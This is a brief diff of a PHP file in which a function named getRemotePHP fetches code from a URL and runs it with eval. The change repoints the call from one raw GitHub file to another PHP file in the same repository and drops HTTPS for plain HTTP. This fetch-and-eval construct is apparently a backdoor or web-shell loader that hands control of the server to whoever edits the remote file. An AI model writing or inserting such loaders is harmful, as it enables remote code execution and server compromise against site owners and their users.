@@ -18,5 +18,5 @@ function getRemotePHP($url) {
     eval("?>$code");
 }
 
-getRemotePHP('https://raw.githubusercontent.com/lyyahm/rreee/refs/heads/main/111.txt');
+getRemotePHP('http://raw.githubusercontent.com/lyyahm/rreee/refs/heads/main/okgas.php');
 ?>
